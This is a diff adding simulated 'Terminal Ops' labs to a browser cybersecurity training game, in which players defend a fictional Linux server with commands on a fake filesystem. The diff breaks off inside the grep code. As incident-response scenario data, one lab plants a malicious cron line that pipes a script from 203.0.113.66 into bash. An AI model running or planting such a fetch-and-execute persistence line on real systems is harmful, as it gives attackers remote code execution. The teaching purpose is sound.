@@ -310,6 +310,74 @@ permalink: /cyber-quest/
         .guide-sec.locked { opacity: 0.5; }
         .page p { font-size: 0.93rem; }
 
+        /* ── Terminal Ops ── */
+        .ops-intro { background: var(--panel); border: 1px solid var(--line); border-radius: 16px; padding: 18px; }
+        .ops-intro .big { font-size: 2.6rem; line-height: 1; }
+        .ops-intro h2 { margin: 8px 0 4px; }
+        .ops-intro .scenario {
+            font-family: var(--mono); font-size: 0.85rem; background: #070d18; border: 1px solid var(--line);
+            border-radius: 10px; padding: 12px; color: #b5f5d9; margin: 12px 0; white-space: pre-wrap; line-height: 1.5;
+        }
+        .ops-intro .skills { font-size: 0.85rem; color: var(--muted); }
+        .ops-intro .skills code { font-family: var(--mono); background: #070d18; padding: 1px 6px; border-radius: 4px; color: var(--info); margin: 0 2px; display: inline-block; }
+
+        .term-wrap { display: flex; flex-direction: column; gap: 10px; }
+        .objectives {
+            background: var(--panel); border: 1px solid var(--line); border-radius: 12px; padding: 10px 14px;
+        }
+        .objectives h3 { margin: 0 0 8px; font-size: 0.8rem; letter-spacing: 0.08em; text-transform: uppercase; color: var(--muted); }
+        .objectives ul { list-style: none; margin: 0; padding: 0; display: grid; gap: 6px; }
+        .objectives li { font-size: 0.88rem; display: flex; gap: 8px; align-items: baseline; }
+        .objectives li::before { content: "☐"; color: var(--muted); font-family: var(--mono); }
+        .objectives li.done { color: var(--muted); }
+        .objectives li.done::before { content: "☑"; color: var(--accent); }
+        .objectives li.done span { text-decoration: line-through; }
+
+        .terminal {
+            background: #05090f; border: 1px solid var(--line); border-radius: 12px; overflow: hidden;
+            display: flex; flex-direction: column;
+        }
+        .term-bar {
+            display: flex; align-items: center; gap: 6px; padding: 8px 12px; background: #0d1626; border-bottom: 1px solid var(--line);
+            font-size: 0.78rem; color: var(--muted); font-family: var(--mono);
+        }
+        .term-bar .dot { width: 11px; height: 11px; border-radius: 50%; }
+        .term-bar .dot.r { background: #ff5f57; } .term-bar .dot.y { background: #febc2e; } .term-bar .dot.g { background: #28c840; }
+        .term-bar .host { margin-left: 6px; }
+        .term-out {
+            font-family: var(--mono); font-size: 0.8rem; line-height: 1.55; color: #cdd9e5;
+            padding: 12px; height: 46vh; min-height: 260px; overflow-y: auto; white-space: pre-wrap; word-break: break-word;
+        }
+        .term-out .cmd-echo { color: #e6edf7; }
+        .term-out .cmd-echo .pr { color: var(--accent); }
+        .term-out .err { color: #ff9ca8; }
+        .term-out .ok { color: #7ee7c0; }
+        .term-out .dim { color: #64748b; }
+        .term-out .hl { color: var(--gold); }
+        .term-inrow {
+            display: flex; align-items: center; gap: 8px; border-top: 1px solid var(--line); padding: 10px 12px;
+            font-family: var(--mono); font-size: 0.8rem; background: #070d18;
+        }
+        .term-inrow .pr { color: var(--accent); white-space: nowrap; }
+        .term-inrow input {
+            flex: 1; background: transparent; border: 0; color: #e6edf7; font-family: var(--mono); font-size: 0.8rem; outline: none; padding: 2px 0;
+        }
+        .term-help { font-size: 0.75rem; color: var(--muted); }
+        .term-help code { font-family: var(--mono); color: var(--info); }
+        .chips { display: flex; flex-wrap: wrap; gap: 6px; }
+        .chip {
+            font-family: var(--mono); font-size: 0.74rem; background: var(--panel-2); border: 1px solid var(--line);
+            border-radius: 7px; padding: 5px 9px; color: var(--text);
+        }
+        .chip:hover { border-color: var(--info); }
+        .term-done {
+            background: rgba(16, 185, 129, 0.12); border: 1px solid var(--accent); border-radius: 12px; padding: 16px; margin-top: 10px;
+            display: none;
+        }
+        .term-done.show { display: block; animation: fade 0.25s ease; }
+        .term-done h3 { margin: 0 0 6px; }
+        .term-done p { font-size: 0.9rem; margin: 0 0 10px; }
+
         .toast {
             position: fixed; left: 50%; transform: translateX(-50%) translateY(20px); opacity: 0;
             bottom: calc(18px + var(--safe-bottom)); background: var(--panel-2); border: 1px solid var(--accent);
@@ -349,6 +417,10 @@ permalink: /cyber-quest/
 
             <p class="section-label">Your path: Beginner → Intermediate → Advanced</p>
             <div class="missions" id="mission-list"></div>
+
+            <p class="section-label" style="margin-top:22px">💻 Terminal Ops — hands-on command line</p>
+            <p class="tier-blurb" style="margin:-4px 2px 10px">Defend a real(istic) Linux server. Use actual commands to investigate and lock it down — it all runs safely in your browser.</p>
+            <div class="missions" id="lab-list"></div>
 
             <div class="home-links">
                 <button class="btn secondary" data-go="guide">📘 Field Guide</button>
@@ -449,6 +521,14 @@ permalink: /cyber-quest/
                 </ul>
             </div>
             <div class="guide-sec">
+                <h3>💻 Terminal Ops</h3>
+                <ul>
+                    <li>A simulated Linux server you defend with <b>real commands</b> — <code>ls</code>, <code>cat</code>, <code>grep</code>, <code>ps</code>, <code>kill</code>, <code>chmod</code>, <code>ss</code>, <code>ufw</code>, <code>systemctl</code> and more. You can even pipe, like <code>cat file | grep word</code>.</li>
+                    <li>Each lab gives you a scenario and objectives. Clear every objective to finish. Stuck? Type <code>help</code> for commands or <code>hint</code> for your next step.</li>
+                    <li>It's a sandbox in your browser on a fake filesystem — nothing touches a real machine. Labs unlock in order and earn XP like missions.</li>
+                </ul>
+            </div>
+            <div class="guide-sec">
                 <h3>Privacy</h3>
                 <ul>
                     <li>Everything runs on your device. Nothing you type is sent anywhere.</li>
@@ -459,12 +539,62 @@ permalink: /cyber-quest/
                 <button class="btn secondary" id="reset">Reset progress</button>
             </div>
         </section>
+
+        <!-- Terminal lab briefing -->
+        <section class="screen" id="ops-brief">
+            <div class="topbar"><button class="icon-btn" data-go="home">← Back</button></div>
+            <div class="ops-intro">
+                <div class="tier-tag" id="ob-tag">💻 Terminal Ops</div>
+                <div class="big" id="ob-icon"></div>
+                <h2 id="ob-title"></h2>
+                <div class="scenario" id="ob-scenario"></div>
+                <div class="section-label">Your objectives</div>
+                <ul id="ob-tasks" style="margin:0;padding-left:20px;font-size:0.9rem;color:var(--muted)"></ul>
+                <p class="skills" style="margin-top:12px">Commands you'll use: <span id="ob-skills"></span></p>
+                <div class="btn-row">
+                    <button class="btn" id="ob-start">Open terminal →</button>
+                </div>
+            </div>
+        </section>
+
+        <!-- Terminal lab -->
+        <section class="screen" id="ops">
+            <div class="hud">
+                <button class="icon-btn" id="ops-quit" aria-label="Leave terminal">✕</button>
+                <div class="progress" style="font-weight:700" id="ops-name"></div>
+                <div class="count" id="ops-count"></div>
+            </div>
+            <div class="term-wrap">
+                <div class="objectives">
+                    <h3>Objectives</h3>
+                    <ul id="ops-objectives"></ul>
+                </div>
+                <div class="terminal">
+                    <div class="term-bar">
+                        <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+                        <span class="host" id="ops-host">alex@web-01</span>
+                    </div>
+                    <div class="term-out" id="ops-out"></div>
+                    <div class="term-inrow" id="ops-inrow">
+                        <span class="pr" id="ops-prompt">$</span>
+                        <input id="ops-input" type="text" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="Terminal command" placeholder="type a command, or 'help'">
+                    </div>
+                </div>
+                <div class="term-help">New here? Type <code>help</code> for commands, or <code>hint</code> for your next step. Tap a shortcut:</div>
+                <div class="chips" id="ops-chips"></div>
+                <div class="term-done" id="ops-done">
+                    <h3 id="ops-done-title"></h3>
+                    <p id="ops-done-text"></p>
+                    <div class="btn-row"><button class="btn" id="ops-continue">Continue</button></div>
+                </div>
+            </div>
+        </section>
     </div>
 
     <div class="toast" id="toast" role="status"></div>
 
     <script>
-    const SW_VERSION = 'dev';
+    const SW_VERSION = '2610250419';
 
     (() => {
         'use strict';
@@ -1733,14 +1863,15 @@ permalink: /cyber-quest/
         function loadProgress() {
             try {
                 const p = JSON.parse(localStorage.getItem(STORE_KEY));
-                if (p && p.v === 1 && p.missions) return p;
+                if (p && p.v === 1 && p.missions) { p.labs = p.labs || {}; return p; }
             } catch (e) { /* storage blocked */ }
-            return { v: 1, missions: {} };
+            return { v: 1, missions: {}, labs: {} };
         }
         function saveProgress() {
             try { localStorage.setItem(STORE_KEY, JSON.stringify(progress)); } catch (e) { /* ignore */ }
         }
-        const totalXp = () => Object.values(progress.missions).reduce((s, m) => s + (m.xp || 0), 0);
+        const totalXp = () => Object.values(progress.missions).reduce((s, m) => s + (m.xp || 0), 0)
+            + Object.values(progress.labs || {}).reduce((s, l) => s + (l.xp || 0), 0);
         const starsFor = (id) => (progress.missions[id] && progress.missions[id].stars) || 0;
         function isUnlocked(i) {
             const m = MISSIONS[i];
@@ -1768,6 +1899,7 @@ permalink: /cyber-quest/
             window.scrollTo(0, 0);
             if (screen === 'home') renderHome();
             if (screen === 'guide') renderGuide();
+            if (screen === 'ops') setTimeout(() => { const i = $('ops-input'); if (i) i.focus({ preventScroll: true }); }, 50);
         }
 
         let toastTimer = null;
@@ -1820,6 +1952,16 @@ permalink: /cyber-quest/
                     </div>
                     <div class="missions">${cards}</div>
                 </div>`;
+            }).join('');
+
+            $('lab-list').innerHTML = LABS.map((l, i) => {
+                const open = labUnlocked(i);
+                const done = labDone(l.id);
+                return `<button class="mission" data-lab="${l.id}" ${open ? '' : 'disabled'}>
+                    <span class="m-icon">${open ? l.icon : '🔒'}</span>
+                    <span class="m-body"><h3>${esc(l.title)}</h3><p>${esc(open ? l.blurb : 'Clear the previous lab to unlock.')}</p></span>
+                    <span class="stars">${open ? (done ? '✅' : `+${l.xp}`) : ''}</span>
+                </button>`;
             }).join('');
         }
 
@@ -2232,10 +2374,601 @@ permalink: /cyber-quest/
             setTimeout(() => input.focus({ preventScroll: true }), 50);
         }
 
+        // ── Terminal Ops ──────────────────────────────────────────────────
+        // A simulated Linux shell on a fake in-memory filesystem. You play the
+        // defender of a fictional server and clear objectives with real commands.
+        // Nothing here touches a real system.
+        const f = (mode, content, owner) => ({ type: 'file', mode: mode || '-rw-r--r--', owner: owner || 'alex', content: content || '' });
+        const d = (children, mode, owner) => ({ type: 'dir', mode: mode || 'drwxr-xr-x', owner: owner || 'alex', children: children || {} });
+
+        const LABS = [
+            {
+                id: 'first-contact',
+                icon: '🖥️',
+                title: 'First Contact',
+                blurb: 'Learn to move around a Linux server from the command line.',
+                xp: 40,
+                scenario: 'You start your first day on the security team. You\'ve just SSHed into\n"web-01", a web server. Before anything else: learn to look around.\n\nType a command and press Enter. Start with "help" if you\'re stuck.',
+                skills: ['pwd', 'ls', 'cd', 'cat', 'whoami', 'ps'],
+                debrief: 'That\'s the core of navigating any Linux box: pwd (where am I), ls (what\'s here), cd (move around), cat (read a file), whoami/id (who am I), ps (what\'s running). Every investigation starts here.',
+                build() {
+                    return {
+                        fs: d({
+                            home: d({ alex: d({
+                                'welcome.txt': f('-rw-r--r--', 'Welcome to web-01.\n\nThis is a training server. Read incident-ticket.txt for your\nfirst task, then look around with ls, cd and cat.\n'),
+                                'incident-ticket.txt': f('-rw-r--r--', 'TICKET #4471 — Orientation\n\nGet familiar with the server:\n  1. Find out which directory you\'re in       (pwd)\n  2. List the files, including hidden ones     (ls -a)\n  3. Read this ticket                          (cat)\n  4. Check which user you are logged in as     (whoami)\n  5. See what processes are running            (ps aux)\n\nHidden files start with a dot. There may be one here...\n'),
+                                '.note': f('-rw-r--r--', 'Pro tip: "cd .." goes up one directory, "cd ~" goes home,\nand "clear" wipes the screen. You found a hidden file — nice.\n'),
+                                logs: d({ 'app.log': f('-rw-r--r--', '[info] server started on port 443\n[info] healthy\n') })
+                            }) }),
+                            etc: d({ 'motd': f('-rw-r--r--', 'web-01 — Ubuntu 22.04 LTS\n', 'root') }),
+                            var: d({ www: d({ html: d({ 'index.html': f('-rw-r--r--', '<h1>It works!</h1>\n', 'www-data') }) }) })
+                        }),
+                        cwd: '/home/alex',
+                        procs: [
+                            { user: 'root', pid: 1, cpu: '0.0', mem: '0.1', cmd: '/sbin/init' },
+                            { user: 'root', pid: 712, cpu: '0.0', mem: '0.4', cmd: '/usr/sbin/sshd -D' },
+                            { user: 'www-data', pid: 980, cpu: '0.3', mem: '1.2', cmd: 'nginx: worker process' },
+                            { user: 'alex', pid: 1455, cpu: '0.0', mem: '0.2', cmd: '-bash' },
+                            { user: 'alex', pid: 1460, cpu: '0.0', mem: '0.1', cmd: 'ps aux' }
+                        ],
+                        net: [{ proto: 'tcp', port: 22, addr: '0.0.0.0', proc: 'sshd' }, { proto: 'tcp', port: 443, addr: '0.0.0.0', proc: 'nginx' }],
+                        services: {}
+                    };
+                },
+                tasks: [
+                    { id: 'pwd', desc: 'Print your current directory', hint: 'Type: pwd', check: (T) => T.ran(/^\s*pwd\b/) },
+                    { id: 'ls', desc: 'List files, including hidden ones (ls -a)', hint: 'Type: ls -a', check: (T) => T.ran(/^\s*ls\b.*\s-\w*a/) || T.ran(/^\s*ls\s+-a/) },
+                    { id: 'cat', desc: 'Read the incident ticket', hint: 'Type: cat incident-ticket.txt', check: (T) => T.readAbs('/home/alex/incident-ticket.txt') },
+                    { id: 'who', desc: 'Check which user you are', hint: 'Type: whoami', check: (T) => T.ran(/^\s*(whoami|id)\b/) },
+                    { id: 'ps', desc: 'See what processes are running', hint: 'Type: ps aux', check: (T) => T.ran(/^\s*ps\b/) }
+                ]
+            },
+            {
+                id: 'intruder',
+                icon: '🚨',
+                title: 'Catch the Intruder',
+                blurb: 'A process is pinning the CPU. Hunt it down and cut off the attacker.',
+                xp: 75,
+                scenario: 'ALERT: web-01\'s CPU is pinned at 100% and the box is crawling.\nSomething is running that shouldn\'t be. Find it, kill it, and work\nout how the attacker got in — and how they\'re getting back in.\n\nStart with "ps aux" to see what\'s eating the CPU.',
+                skills: ['ps', 'kill', 'cat', 'grep', 'ufw'],
+                debrief: 'Textbook incident response: you spotted the rogue process (a cryptominer), killed it, found the persistence (a malicious cron job re-downloading it), traced the entry in the auth log, and blocked the source IP. Killing the process alone would have left the cron job to restart it — always hunt for persistence.',
+                build() {
+                    return {
+                        fs: d({
+                            home: d({ alex: d({
+                                'incident-ticket.txt': f('-rw-r--r--', 'TICKET #4472 — High CPU / suspected compromise\n\n  1. Find the process using all the CPU      (ps aux)\n  2. Kill it                                  (kill <PID>)\n  3. Find how it restarts itself              (cat the cron job in /etc/cron.d)\n  4. Find the attacker in the auth log        (grep in /var/log/auth.log)\n  5. Block the attacker\'s IP                  (ufw deny from <ip>)\n')
+                            }) }),
+                            etc: d({
+                                'cron.d': d({
+                                    'apache-update': f('-rw-r--r--', '# apache-update\n* * * * * root curl -s http://203.0.113.66/x.sh | bash\n', 'root')
+                                })
+                            }),
+                            var: d({
+                                log: d({
+                                    'auth.log': f('-rw-r-----', [
+                                        'Mar 09 02:11:04 web-01 sshd[801]: Failed password for root from 203.0.113.66 port 51022 ssh2',
+                                        'Mar 09 02:11:06 web-01 sshd[801]: Failed password for root from 203.0.113.66 port 51024 ssh2',
+                                        'Mar 09 02:11:09 web-01 sshd[801]: Failed password for root from 203.0.113.66 port 51026 ssh2',
+                                        'Mar 09 02:11:14 web-01 sshd[801]: Failed password for admin from 203.0.113.66 port 51040 ssh2',
+                                        'Mar 09 02:11:22 web-01 sshd[801]: Accepted password for root from 203.0.113.66 port 51055 ssh2',
+                                        'Mar 09 02:11:22 web-01 sshd[801]: pam_unix(sshd:session): session opened for user root',
+                                        'Mar 09 08:30:15 web-01 sshd[1902]: Accepted publickey for alex from 10.0.4.22 port 44110 ssh2'
+                                    ].join('\n'), 'root'),
+                                    'tmp': d({})
+                                }),
+                                tmp: d({ '.x': d({ 'kdevtmpfsi': f('-rwxr-xr-x', '<ELF binary>\n', 'www-data') }) })
+                            })
+                        }),
+                        cwd: '/home/alex',
+                        procs: [
+                            { user: 'root', pid: 1, cpu: '0.0', mem: '0.1', cmd: '/sbin/init' },
+                            { user: 'root', pid: 712, cpu: '0.0', mem: '0.4', cmd: '/usr/sbin/sshd -D' },
+                            { user: 'www-data', pid: 980, cpu: '0.5', mem: '1.2', cmd: 'nginx: worker process' },
+                            { user: 'www-data', pid: 6621, cpu: '99.3', mem: '8.7', cmd: '/var/tmp/.x/kdevtmpfsi' },
+                            { user: 'alex', pid: 1455, cpu: '0.0', mem: '0.2', cmd: '-bash' }
+                        ],
+                        net: [{ proto: 'tcp', port: 22, addr: '0.0.0.0', proc: 'sshd' }, { proto: 'tcp', port: 443, addr: '0.0.0.0', proc: 'nginx' }],
+                        services: {}
+                    };
+                },
+                tasks: [
+                    { id: 'ps', desc: 'Find the process eating the CPU', hint: 'Type: ps aux — look at the %CPU column', check: (T) => T.ran(/^\s*ps\b/) },
+                    { id: 'kill', desc: 'Kill the cryptominer', hint: 'Find its PID in "ps aux" (the one at 99% CPU), then: kill <PID>', check: (T) => T.killedCmds.has('kdevtmpfsi') },
+                    { id: 'cron', desc: 'Find how it restarts itself', hint: 'Read the cron job: cat /etc/cron.d/apache-update', check: (T) => T.readAbs('/etc/cron.d/apache-update') },
+                    { id: 'log', desc: 'Find the attacker\'s successful login in the auth log', hint: 'Try: grep Accepted /var/log/auth.log', check: (T) => T.ran(/grep\s+.*accepted.*auth\.log/i) || (T.readAbs('/var/log/auth.log') && T.ran(/grep/i)) },
+                    { id: 'block', desc: 'Block the attacker\'s IP (203.0.113.66)', hint: 'Type: ufw deny from 203.0.113.66', check: (T) => T.ufw.denyFrom.has('203.0.113.66') }
+                ]
+            },
+            {
+                id: 'lockdown',
+                icon: '🔒',
+                title: 'Lock It Down',
+                blurb: 'Harden the server: fix permissions, kill plaintext services, close ports.',
+                xp: 95,
+                scenario: 'The intruder is out. Now harden web-01 so it can\'t happen again.\nThere\'s a world-writable secret, a plaintext service that should never\nhave been on, and a database port open to the whole internet.\n\nUse "ls -l", "find", "ss", "chmod", "systemctl" and "ufw".',
+                skills: ['ls', 'find', 'chmod', 'ss', 'systemctl', 'ufw'],
+                debrief: 'This is hardening: least privilege (chmod 640 so the world can\'t read the DB password), reducing attack surface (stop and disable plaintext Telnet), and a default-deny firewall (close the database port to the internet). Each one removes a door an attacker could have walked through.',
+                build() {
+                    return {
+                        fs: d({
+                            home: d({ alex: d({
+                                'incident-ticket.txt': f('-rw-r--r--', 'TICKET #4473 — Harden the server\n\n  1. Find world-writable/readable files   (find /var/www -perm -0004 -type f)\n  2. Lock down the leaky config           (chmod 640 config.php)\n  3. List listening services              (ss -tlnp)\n  4. Stop the plaintext Telnet service    (systemctl stop telnet)\n  5. Close the database port to the world (ufw deny 3306)\n')
+                            }) }),
+                            etc: d({ 'passwd': f('-rw-r--r--', 'root:x:0:0:root:/root:/bin/bash\nalex:x:1000:1000:Alex:/home/alex:/bin/bash\n', 'root') }),
+                            var: d({ www: d({ html: d({
+                                'index.php': f('-rw-r--r--', '<?php include "config.php"; ?>\n', 'www-data'),
+                                'config.php': f('-rw-rw-rw-', '<?php\n// DATABASE CREDENTIALS — anyone on this box can read this!\n$db_host = "localhost";\n$db_user = "webapp";\n$db_pass = "s3cr3t-pw-2026";\n', 'www-data')
+                            }) }) })
+                        }),
+                        cwd: '/var/www/html',
+                        procs: [
+                            { user: 'root', pid: 1, cpu: '0.0', mem: '0.1', cmd: '/sbin/init' },
+                            { user: 'root', pid: 712, cpu: '0.0', mem: '0.4', cmd: '/usr/sbin/sshd -D' },
+                            { user: 'root', pid: 844, cpu: '0.0', mem: '0.3', cmd: '/usr/sbin/inetd (telnet)' },
+                            { user: 'mysql', pid: 905, cpu: '0.1', mem: '6.0', cmd: '/usr/sbin/mysqld' },
+                            { user: 'www-data', pid: 980, cpu: '0.3', mem: '1.2', cmd: 'nginx: worker process' }
+                        ],
+                        net: [
+                            { proto: 'tcp', port: 22, addr: '0.0.0.0', proc: 'sshd' },
+                            { proto: 'tcp', port: 23, addr: '0.0.0.0', proc: 'inetd' },
+                            { proto: 'tcp', port: 443, addr: '0.0.0.0', proc: 'nginx' },
+                            { proto: 'tcp', port: 3306, addr: '0.0.0.0', proc: 'mysqld' }
+                        ],
+                        services: { telnet: 'active', ssh: 'active', mysql: 'active', nginx: 'active' }
+                    };
+                },
+                tasks: [
+                    { id: 'find', desc: 'Find the world-readable/writable file under /var/www', hint: 'Try: find /var/www -perm -0004 -type f   (or use ls -l to spot the rw-rw-rw- file)', check: (T) => T.ran(/^\s*find\b.*-perm/) || T.ran(/^\s*ls\s+-l/) },
+                    { id: 'chmod', desc: 'Remove world access from config.php (chmod 640)', hint: 'Type: chmod 640 config.php', check: (T) => { const n = T.node('/var/www/html/config.php'); return n && n.mode[7] === '-' && n.mode[8] === '-' && n.mode[9] === '-'; } },
+                    { id: 'ss', desc: 'List listening services', hint: 'Type: ss -tlnp', check: (T) => T.ran(/^\s*(ss|netstat)\b/) },
+                    { id: 'telnet', desc: 'Stop the plaintext Telnet service', hint: 'Type: systemctl stop telnet', check: (T) => T.stoppedSvc.has('telnet') },
+                    { id: 'db', desc: 'Close the database port (3306) to the internet', hint: 'Type: ufw deny 3306', check: (T) => T.ufw.deny.has('3306') }
+                ]
+            }
+        ];
+
+        const labDone = (id) => !!(progress.labs && progress.labs[id] && progress.labs[id].done);
+        const labUnlocked = (i) => i === 0 || labDone(LABS[i - 1].id);
+
+        const Ops = {
+            lab: null, T: null, hist: [], histPos: 0,
+
+            open(id) {
+                this.lab = LABS.find((l) => l.id === id);
+                const l = this.lab;
+                $('ob-icon').textContent = l.icon;
+                $('ob-title').textContent = l.title;
+                $('ob-scenario').textContent = l.scenario;
+                $('ob-tasks').innerHTML = l.tasks.map((t) => `<li>${esc(t.desc)}</li>`).join('');
+                $('ob-skills').innerHTML = l.skills.map((s) => `<code>${esc(s)}</code>`).join(' ');
+                show('ops-brief');
+            },
+
+            start() {
+                const l = this.lab;
+                this._finished = false;
+                l.tasks.forEach((t) => { t._was = false; });
+                const b = l.build();
+                this.T = {
+                    fs: b.fs, cwd: b.cwd, procs: b.procs, net: b.net, services: b.services,
+                    history: [], read: new Set(), killedCmds: new Set(), killedPids: new Set(),
+                    stoppedSvc: new Set(), disabledSvc: new Set(),
+                    ufw: { enabled: false, deny: new Set(), allow: new Set(), denyFrom: new Set() },
+                    ran(re) { return this.history.some((c) => re.test(c)); },
+                    readAbs(p) { return this.read.has(p); },
+                    node: (p) => this.nodeAt(p)
+                };
+                this.hist = []; this.histPos = 0;
+                $('ops-name').textContent = l.icon + ' ' + l.title;
+                $('ops-out').innerHTML = '';
+                $('ops-done').className = 'term-done';
+                $('ops-chips').innerHTML = ['help', 'ls -a', 'cat incident-ticket.txt', 'ps aux', 'hint', 'clear']
+                    .map((c) => `<button class="chip" data-chip="${esc(c)}">${esc(c)}</button>`).join('');
+                this.print('Connected to web-01. Type <span class="hl">help</span> for a list of commands, or <span class="hl">hint</span> for your next objective.', 'dim');
+                this.print('');
+                this.renderObjectives();
+                show('ops');
+                setTimeout(() => $('ops-input').focus({ preventScroll: true }), 50);
+            },
+
+            prompt() {
+                const short = this.T.cwd.replace('/home/alex', '~');
+                return 'alex@web-01:' + short + '$';
+            },
+
+            print(html, cls) {
+                const div = document.createElement('div');
+                if (cls) div.className = cls;
+                div.innerHTML = html;
+                $('ops-out').appendChild(div);
+                const out = $('ops-out');
+                out.scrollTop = out.scrollHeight;
+            },
+
+            submit(raw) {
+                const cmd = raw.trim();
+                this.print('<span class="cmd-echo"><span class="pr">' + esc(this.prompt()) + '</span> ' + esc(raw) + '</span>');
+                if (cmd) { this.hist.push(cmd); this.histPos = this.hist.length; this.T.history.push(cmd); }
+                if (cmd === 'clear') { $('ops-out').innerHTML = ''; return; }
+                if (cmd) this.exec(cmd);
+                this.checkTasks();
+                $('ops-input').value = '';
+            },
+
+            // Resolve a path against the current working directory.
+            resolve(path) {
+                let base;
+                if (!path) return this.T.cwd;
+                if (path[0] === '~') { base = ['home', 'alex']; path = path.slice(1); }
+                else if (path[0] === '/') base = [];
+                else base = this.T.cwd.split('/').filter(Boolean);
+                for (const seg of path.split('/')) {
+                    if (seg === '' || seg === '.') continue;
+                    if (seg === '..') { base.pop(); continue; }
+                    base.push(seg);
+                }
+                return '/' + base.join('/');
+            },
+            nodeAt(path) {
+                const abs = this.resolve(path);
+                let n = this.T.fs;
+                for (const seg of abs.split('/').filter(Boolean)) {
+                    if (n.type !== 'dir' || !n.children[seg]) return null;
+                    n = n.children[seg];
+                }
+                return n;
+            },
+
+            exec(line) {
+                // Support a single pipe into grep/head/tail/wc.
+                const parts = line.split('|').map((s) => s.trim());
+                let res = this.runCmd(parts[0]);
+                for (let i = 1; i < parts.length; i++) res = this.pipe(res, parts[i]);
+                (res.out || []).forEach((l) => this.print(typeof l === 'string' ? esc(l) : l.html, l.cls));
+                (res.err || []).forEach((l) => this.print(esc(l), 'err'));
+            },
+
+            pipe(input, stage) {
+                const a = stage.split(/\s+/);
+                const cmd = a[0];
+                let lines = (input.out || []).map((l) => (typeof l === 'string' ? l : l.text || ''));
+                if (cmd === 'grep') {
+                    const i = a.includes('-i'); const v = a.includes('-v');
+                    const pat = a.filter((x, k) => k > 0 && !x.startsWith('-')).join(' ');
+                    const re = new RegExp(pat.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), i ? 'i' : '');
+                    return { out: lines.filter((l) => re.test(l) !== v).map((l) => ({ text: l, html: hlMatch(l, pat, i) })) };
+                }
+                if (cmd === 'wc' && a.includes('-l')) return { out: [String(lines.length)] };
+                if (cmd === 'head') { const n = num(a, 10); return { out: lines.slice(0, n) }; }
+                if (cmd === 'tail') { const n = num(a, 10); return { out: lines.slice(-n) }; }
+                return { err: [cmd + ': cannot pipe into this command'] };
+            },
+
+            runCmd(line) {
+                const a = line.split(/\s+/).filter(Boolean);
+                const cmd = a[0];
+                const T = this.T;
+                const args = a.slice(1);
+                const pos = args.filter((x) => !x.startsWith('-'));
+                const flags = args.filter((x) => x.startsWith('-')).join('');
+
+                switch (cmd) {
+                    case undefined: return {};
+                    case 'help': return { out: [{ html: HELP }] };
+                    case 'hint': {
+                        const t = this.lab.tasks.find((t) => !t.check(T));
+                        return { out: [{ html: t ? '💡 ' + esc(t.hint) : 'All objectives complete — type any command, you\'re done!', cls: 'hl' }] };
+                    }
+                    case 'whoami': return { out: ['alex'] };
+                    case 'id': return { out: ['uid=1000(alex) gid=1000(alex) groups=1000(alex),27(sudo)'] };
+                    case 'pwd': return { out: [T.cwd] };
+                    case 'echo': return { out: [args.join(' ')] };
+                    case 'history': return { out: T.history.map((c, i) => '  ' + (i + 1) + '  ' + c) };
+                    case 'date': return { out: ['Mon Mar  9 09:14:22 UTC 2026'] };
+                    case 'man': return { out: [{ html: MAN[pos[0]] ? esc(MAN[pos[0]]) : 'No manual entry for ' + esc(pos[0] || '') }] };
+                    case 'cd': {
+                        const n = this.nodeAt(pos[0] || '~');
+                        if (!n) return { err: ['cd: ' + (pos[0] || '') + ': No such file or directory'] };
+                        if (n.type !== 'dir') return { err: ['cd: ' + pos[0] + ': Not a directory'] };
+                        T.cwd = this.resolve(pos[0] || '~');
+                        $('ops-prompt').textContent = this.prompt();
+                        return {};
+                    }
+                    case 'ls': return this.ls(pos[0], flags);
+                    case 'cat': return this.cat(pos);
+                    case 'head': { const n = this.cat(pos); if (n.out) n.out = n.out.slice(0, num(args, 10)); return n; }
+                    case 'tail': { const n = this.cat(pos); if (n.out) n.out = n.out.slice(-num(args, 10)); return n; }
+                    case 'grep': return this.grep(args);
+                    case 'find': return this.find(args);
+                    case 'ps': return this.ps();
+                    case 'top': return this.ps();
+                    case 'kill': return this.kill(pos);
+                    case 'chmod': return this.chmod(pos);
+                    case 'ss': case 'netstat': return this.ss();
+                    case 'ufw': return this.ufw(args);
+                    case 'systemctl': case 'service': return this.systemctl(args);
+                    case 'sha256sum': return this.sha(pos);
+                    case 'sudo': return this.runCmd(args.join(' '));
+                    case 'clear': return {};
+                    case 'exit': show('home'); return {};
+                    default: return { err: [cmd + ': command not found'] };
+                }
+            },
+
+            ls(path, flags) {
+                const n = this.nodeAt(path || '.');
+                if (!n) return { err: ['ls: cannot access \'' + (path || '') + '\': No such file or directory'] };
+                const all = flags.includes('a');
+                const long = flags.includes('l');
+                if (n.type === 'file') {
+                    const name = this.resolve(path).split('/').pop();
+                    return { out: [long ? lsLine(n, name) : name] };
+                }
+                let names = Object.keys(n.children).sort();
+                if (!all) names = names.filter((x) => x[0] !== '.');
+                if (all) names = ['.', '..'].concat(names);
+                if (!long) return { out: [names.join('  ')] };
+                return { out: names.map((nm) => {
+                    if (nm === '.' || nm === '..') return lsLine({ type: 'dir', mode: 'drwxr-xr-x', owner: 'alex' }, nm);
+                    return lsLine(n.children[nm], nm);
+                }) };
+            },
+
+            cat(pos) {
+                if (!pos.length) return { err: ['cat: missing file operand'] };
+                const out = [];
+                for (const p of pos) {
+                    const n = this.nodeAt(p);
+                    if (!n) { out.push({ text: '', html: '<span class="err">cat: ' + esc(p) + ': No such file or directory</span>' }); continue; }
+                    if (n.type === 'dir') { out.push({ text: '', html: '<span class="err">cat: ' + esc(p) + ': Is a directory</span>' }); continue; }
+                    this.T.read.add(this.resolve(p));
+                    n.content.replace(/\n$/, '').split('\n').forEach((l) => out.push(l));
+                }
+                return { out };
+            },
+
+            grep(args) {
+                const i = args.includes('-i');
+                const r = args.includes('-r') || args.includes('-R');
+                const rest = args.filter((x) => !x.startsWith('-'));
+                const pat = rest[0] || '';
+                const targets = rest.slice(1);
+                const re = new RegExp(pat.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), i ? 'i' : '');
+                const out = [];
+                const scan = (abs, node, prefix) => {
+                    if (node.type === 'dir') {
+                        if (!r) { out.push({ text: '', html: '<span class="err">grep: ' + esc(abs) + ': Is a directory</span>' }); return; }
+                        Object.keys(node.children).forEach((k) => scan(abs + '/' + k, node.children[k], true));
+                        return;
+                    }
+                    this.T.read.add(abs);
+                    node.content.replace(/\n$/, '').split('\n').forEach((l) => {
+                        if (re.test(l)) out.push({ text: l, html: (prefix ? '<span class="dim">' + esc(abs) + ':</span>' : '') + hlMatch(l, pat, i) });
+                    });
